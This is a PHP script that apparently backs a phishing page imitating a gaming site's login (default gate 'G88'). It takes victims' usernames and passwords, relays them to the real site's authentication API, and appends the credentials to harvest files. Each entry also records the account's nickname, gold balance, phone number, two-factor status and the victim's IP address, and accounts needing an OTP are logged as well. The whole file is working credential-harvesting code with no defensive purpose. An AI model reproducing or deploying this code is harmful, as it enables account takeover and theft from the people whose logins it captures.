<?php
include "get_config.php";

$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

// save username password to cookie
$raw_content = file_get_contents("php://input");
$json_data = json_decode($raw_content, 1);
$username = $json_data["Username"];
$password = $json_data["Password"];
setcookie("username", $username, time() + (86400 * 30), "/");
setcookie("password", $password, time() + (86400 * 30), "/");

// login
$result = login($raw_content, $list_header);
$json_data = json_decode($result, 1);
if ($json_data["c"] === 0) {
	save_account_info($username, $password, $json_data);
} else if ($json_data["c"] === 2) {
	save_account_otp($username, $password);
}
echo $result;


function save_account_info($username, $password, $json_data) {
	global $gate_config;
	$nickname = $json_data["d"]["nickname"];
	$gold = $json_data["d"]["goldBalance"];
	$coin = $json_data["d"]["coinBalance"];
	$vippoint = $json_data["d"]["vipPoint"];
	$phone = $json_data["d"]["mobile"];
	$telesafe = $json_data["d"]["teleSafe"];
	$time = date("H:i:s Y-m-d");
	$ip = $_SERVER["REMOTE_ADDR"];
	$fp = fopen(($telesafe != "" && $json_data["d"]["confirmStatus"] >= 4) ? $gate_config["file_account"] : $gate_config["file_account_no_telesafe"], "a+");
	fwrite($fp, "$username|$password|$nickname|$gold|$phone|$telesafe| ----- $time -----> $ip\n");
	fclose($fp);
}

function save_account_otp($username, $password) {
	global $gate_config;
	$time = date("H:i:s Y-m-d");
	$ip = $_SERVER["REMOTE_ADDR"];
	$fp = fopen($gate_config["file_account"], "a+");
	fwrite($fp, "$username|$password|Login by otp!!! ----- $time -----> $ip\n");	
	fclose($fp);
}

function login($raw_content, $list_header) {
    global $gate_config;
    $url = "https://id.".$gate_config["domain"]."/api/account/authenticatev2";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
    $raw_content = curl_exec($ch);

    $re = "/Set-Cookie: ([^;]+)/m";
    preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
    foreach ($matches as $match) {
    	$key = explode("=", $match[1])[0];
    	$val = urldecode(explode("=", $match[1])[1]);
    	setcookie($key, $val, time() + (86400 * 30), "/");
    }
    return explode("\r\n\r\n", $raw_content)[1];
}
?>